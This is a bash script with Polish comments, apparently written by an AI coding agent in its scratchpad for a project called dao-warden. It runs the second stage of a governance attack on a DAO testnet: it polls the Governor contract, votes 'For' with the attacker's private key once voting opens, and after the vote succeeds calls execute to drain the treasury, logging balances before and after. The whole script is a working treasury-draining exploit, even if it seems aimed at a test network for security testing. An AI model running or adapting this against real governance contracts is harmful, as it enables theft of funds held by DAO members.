#!/usr/bin/env bash
# Etap 2 — dokonczenie ataku on-chain: czeka na okna czasowe Governora i dziala.
# Uruchamiane w tle (glosowanie trwa ~1h realnego czasu — nie da sie vm.warp na zywej sieci).
set -u
export NVM_DIR="$HOME/.nvm"; [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
cd /home/kajko/dao-warden
set -a; . ./.env; set +a
CTX=/tmp/claude-1000/-home-kajko/d9ba00ea-2f7a-4586-b13e-4e7b8d4dc388/scratchpad/attack_ctx.env
. "$CTX"
R="--rpc-url $ARC_TESTNET_RPC_URL"
LOG=/tmp/claude-1000/-home-kajko/d9ba00ea-2f7a-4586-b13e-4e7b8d4dc388/scratchpad/attack.log
: > "$LOG"

say(){ echo "[$(date -u +%H:%M:%S)] $*" | tee -a "$LOG"; }
state(){ cast call "$GOV" 'state(uint256)(uint8)' "$PID" $R | awk '{print $1}'; }
bal(){ cast call "$ASSET" 'balanceOf(address)(uint256)' "$1" $R | awk '{print $1}'; }

say "START ataku; PID=$PID"

# --- Faza 1: czekaj na start glosowania (Active=1) ---
while true; do
  S=$(state)
  say "state=$S (czekam na Active=1)"
  [ "$S" = "1" ] && break
  if [ "$S" = "2" ] || [ "$S" = "3" ]; then say "STOP: propozycja anulowana/przegrana ($S)"; exit 1; fi
  sleep 20
done

say "ACTIVE -> attacker glosuje For (support=1)"
cast send "$GOV" "castVote(uint256,uint8)" "$PID" 1 --private-key "$ATTACKER_PRIVATE_KEY" $R --json 2>&1 \
  | grep -o '"transactionHash":"0x[a-f0-9]*"' | head -1 | tee -a "$LOG"
say "proposalVotes (against,for,abstain) = $(cast call "$GOV" 'proposalVotes(uint256)(uint256,uint256,uint256)' "$PID" $R | tr '\n' ' ')"

# --- Faza 2: czekaj na koniec glosowania (Succeeded=4) ---
while true; do
  S=$(state)
  NOW=$(cast block latest --field timestamp $R)
  say "state=$S now=$NOW deadline=$VD reszta=$(( VD-NOW ))s (czekam na Succeeded=4)"
  [ "$S" = "4" ] && break
  if [ "$S" = "3" ]; then say "DEFEATED (3) — atak powstrzymany"; exit 1; fi
  sleep 60
done

# --- Faza 3: wykonanie = drenaz skarbca ---
say "SUCCEEDED -> execute (drenaz)"
say "PRZED: treasury mUSD = $(bal "$TREAS") | attacker mUSD = $(bal "$ATTACKER_ADDRESS")"
cast send "$GOV" "execute(address[],uint256[],bytes[],bytes32)" "[$TREAS]" "[0]" "[$CALLDATA]" "$DESC_HASH" \
  --private-key "$ATTACKER_PRIVATE_KEY" $R --json 2>&1 \
  | grep -o '"transactionHash":"0x[a-f0-9]*"' | head -1 | tee -a "$LOG"
sleep 3
say "state po execute = $(state) (7=Executed)"
say "PO:    treasury mUSD = $(bal "$TREAS") | attacker mUSD = $(bal "$ATTACKER_ADDRESS")"
say "=== ATAK ZAKONCZONY ==="
